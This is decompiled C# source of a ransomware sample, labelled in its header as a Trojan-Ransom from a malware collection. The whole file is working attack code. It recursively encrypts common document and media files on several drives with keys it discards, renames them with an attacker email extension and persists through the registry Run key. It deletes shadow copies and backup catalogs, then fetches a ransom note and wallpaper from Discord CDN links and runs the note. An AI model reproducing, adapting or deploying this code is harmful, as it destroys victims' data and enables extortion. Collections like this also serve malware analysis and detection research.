// Decompiled with JetBrains decompiler
// Type: B221.Form1
// Assembly: B221, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 43B4240F-9760-48F5-B991-90E3259DB12E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-6b2affdfb3fe673b22ba6108fc78986ffea8167c5f3a80834e48378659d0ea83.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace B221
{
  public class Form1 : Form
  {
    private const uint SPI_SETDESKWALLPAPER = 20;
    private const uint SPIF_UPDATEINIFILE = 1;
    private const uint SPIF_SENDWININICHANGE = 2;
    private IContainer components = (IContainer) null;
    private CheckBox chkUpdateRegistry;
    private TextBox d654654;

    public Form1() => this.InitializeComponent();

    private byte[] customAes(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 9,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public static byte[] CustomRC4(byte[] bytes, byte[] key)
    {
      byte[] numArray1 = new byte[bytes.Length];
      byte[] numArray2 = new byte[2048];
      byte[] numArray3 = new byte[2048];
      for (int index = 0; index < 2048; ++index)
      {
        numArray2[index] = (byte) index;
        numArray3[index] = key[index % key.GetLength(0)];
      }
      int index1 = 0;
      for (int index2 = 0; index2 < 2048; ++index2)
      {
        index1 = (index1 + (int) numArray2[index2] + (int) numArray3[index2]) % 2048;
        byte num = numArray2[index2];
        numArray2[index2] = numArray2[index1];
        numArray2[index1] = num;
      }
      int index3;
      int index4 = index3 = 0;
      for (int index5 = 0; index5 < numArray1.GetLength(0); ++index5)
      {
        index4 = (index4 + 1) % 2048;
        index3 = (index3 + (int) numArray2[index4]) % 2048;
        byte num = numArray2[index4];
        numArray2[index4] = numArray2[index3];
        numArray2[index3] = num;
        int index6 = ((int) numArray2[index4] + (int) numArray2[index3]) % 2048;
        numArray1[index5] = (byte) ((uint) bytes[index5] ^ (uint) numArray2[index6]);
      }
      return numArray1;
    }

    public string passgen(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    public void fileEncryption(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.customAes(bytesToBeEncrypted, hash);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file);
    }

    public void fileEncryptionrc4(string file, string password)
    {
      byte[] bytes1 = System.IO.File.ReadAllBytes(file);
      byte[] bytes2 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes2);
      byte[] bytes3 = Form1.CustomRC4(bytes1, hash);
      System.IO.File.WriteAllBytes(file, bytes3);
      this.genExt();
      System.IO.File.Move(file, file + ".[neftet@tutanota.com].boom");
    }

    private string genExt() => this.passgen(12).ToString();

    private void persistence() => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("rundll.exe", (object) Application.ExecutablePath.ToString());

    public void MainEncryption(string dest, string key)
    {
      try
      {
        string[] source = new string[41]
        {
          ".txt",
          ".doc",
          ".docx",
          ".xls",
          ".index",
          ".pdf",
          ".zip",
          ".rar",
          ".css",
          ".lnk",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".bmp",
          ".png",
          ".csv",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".xml",
          ".psd",
          ".bk",
          ".bat",
          ".mp3",
          ".mp4",
          ".wav",
          ".wma",
          ".avi",
          ".divx",
          ".mkv",
          ".mpeg",
          ".wmv",
          ".mov",
          ".ogg",
          ".rtf"
        };
        string[] files = Directory.GetFiles(dest);
        string[] directories = Directory.GetDirectories(dest);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.fileEncryption(files[index], key);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.MainEncryption(directories[index], key);
      }
      catch (Exception ex)
      {
      }
    }

    public void rc4dir(string dest, string key)
    {
      try
      {
        string[] source = new string[43]
        {
          ".txt",
          ".doc",
          ".docx",
          ".xls",
          ".index",
          ".pdf",
          ".zip",
          ".rar",
          ".css",
          ".lnk",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".bmp",
          ".png",
          ".csv",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".htm",
          ".ml",
          ".xml",
          ".psd",
          ".bk",
          ".bat",
          ".mp3",
          ".mp4",
          ".wav",
          ".wma",
          ".avi",
          ".divx",
          ".mkv",
          ".mpeg",
          ".wmv",
          ".mov",
          ".ogg",
          ".rtf"
        };
        string[] files = Directory.GetFiles(dest);
        string[] directories = Directory.GetDirectories(dest);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.fileEncryptionrc4(files[index], key);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.rc4dir(directories[index], key);
      }
      catch (Exception ex)
      {
      }
    }

    public static void clearmem()
    {
      Process currentProcess = Process.GetCurrentProcess();
      try
      {
        currentProcess.MinWorkingSet = (IntPtr) 300000;
      }
      catch (Exception ex)
      {
        throw new Exception();
      }
    }

    private void encryptionStage()
    {
      string key1 = this.passgen(32);
      string key2 = this.passgen(256);
      this.MainEncryption("C:\\", key1);
      this.MainEncryption("D:\\", key1);
      this.MainEncryption("E:\\", key1);
      this.MainEncryption("F:\\", key1);
      this.MainEncryption("G:\\", key1);
      this.MainEncryption("Z:\\", key1);
      this.MainEncryption("A:\\", key1);
      this.rc4dir("C:\\", key2);
      this.rc4dir("D:\\", key2);
      this.rc4dir("E:\\", key2);
      this.rc4dir("F:\\", key2);
      this.rc4dir("G:\\", key2);
      this.rc4dir("Z:\\", key2);
      this.rc4dir("A:\\", key2);
      Form1.clearmem();
    }

    public void x3()
    {
      this.deleteRecovery();
      Thread.Sleep(1200);
      this.deleteRecovery();
      Thread.Sleep(1200);
      this.deleteRecovery();
    }

    public void deleteRecovery()
    {
      try
      {
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd.exe",
            Arguments = "/C vssadmin.exe delete shadows /all /quiet"
          }
        }.Start();
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd.exe",
            Arguments = "/C wmic shadowcopy delete"
          }
        }.Start();
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd.exe",
            Arguments = "/C wbadmin delete catalog -quiet"
          }
        }.Start();
      }
      catch (Exception ex)
      {
      }
    }

    private static byte[] distDownload(string url)
    {
      while (true)
      {
        try
        {
          using (WebClient webClient = new WebClient())
            return webClient.DownloadData(url);
        }
        catch
        {
          Thread.Sleep(5000);
        }
      }
    }

    private void wallpap()
    {
      new WebClient().DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/599226424695455755/800087465523675176/65QEF.bmp"), Application.StartupPath + "\\65QEF.bmp");
      this.d654654.Text = Application.StartupPath + "\\65QEF.bmp";
      Thread.Sleep(1200);
      this.wlpp(this.d654654.Text, this.chkUpdateRegistry.Checked);
    }

    private void extract()
    {
      byte[] payloadBuffer = Form1.distDownload("https://cdn.discordapp.com/attachments/599226424695455755/798932401216552974/READ_ME.hta");
      if (!System.IO.File.Exists(Environment.SpecialFolder.Startup.ToString() + "\\READ_ME.hta"))
        Form1.persist(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\READ_ME.hta", payloadBuffer);
      if (System.IO.File.Exists(Environment.SpecialFolder.Desktop.ToString() + "\\READ_ME.hta"))
        return;
      Form1.install(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME.hta", payloadBuffer);
    }

    private void payload()
    {
      this.persistence();
      this.encryptionStage();
      this.wallpap();
      this.extract();
      this.x3();
      Form1.clearmem();
      Application.Exit();
    }

    private static bool install(string dropPath, byte[] payloadBuffer)
    {
      if (Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
        return false;
      try
      {
        FileStream fileStream = System.IO.File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew);
        fileStream.Write(payloadBuffer, 0, payloadBuffer.Length);
        fileStream.Dispose();
        Process.Start(dropPath);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static bool persist(string dropPath, byte[] payloadBuffer)
    {
      if (Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
        return false;
      try
      {
        FileStream fileStream = System.IO.File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew);
        fileStream.Write(payloadBuffer, 0, payloadBuffer.Length);
        fileStream.Dispose();
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static void GoodBye()
    {
      ProcessStartInfo startInfo = (ProcessStartInfo) null;
      try
      {
        startInfo = new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        };
      }
      catch
      {
      }
      finally
      {
        Process.Start(startInfo);
        Environment.Exit(0);
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.payload();
      Form1.clearmem();
    }

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    private void wlpp(string file_name, bool update_registry)
    {
      try
      {
        uint fWinIni = 0;
        if (update_registry)
          fWinIni = 3U;
        if (Form1.SystemParametersInfo(20U, 0U, file_name, fWinIni))
          ;
      }
      catch (Exception ex)
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.chkUpdateRegistry = new CheckBox();
      this.d654654 = new TextBox();
      this.SuspendLayout();
      this.chkUpdateRegistry.AutoSize = true;
      this.chkUpdateRegistry.Location = new Point(12, 12);
      this.chkUpdateRegistry.Name = "chkUpdateRegistry";
      this.chkUpdateRegistry.Size = new Size(98, 17);
      this.chkUpdateRegistry.TabIndex = 0;
      this.chkUpdateRegistry.Text = "984654654654";
      this.chkUpdateRegistry.UseVisualStyleBackColor = true;
      this.d654654.Location = new Point(12, 40);
      this.d654654.Name = "d654654";
      this.d654654.Size = new Size(199, 20);
      this.d654654.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(223, 72);
      this.Controls.Add((Control) this.d654654);
      this.Controls.Add((Control) this.chkUpdateRegistry);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.Text = "notepad.exe";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
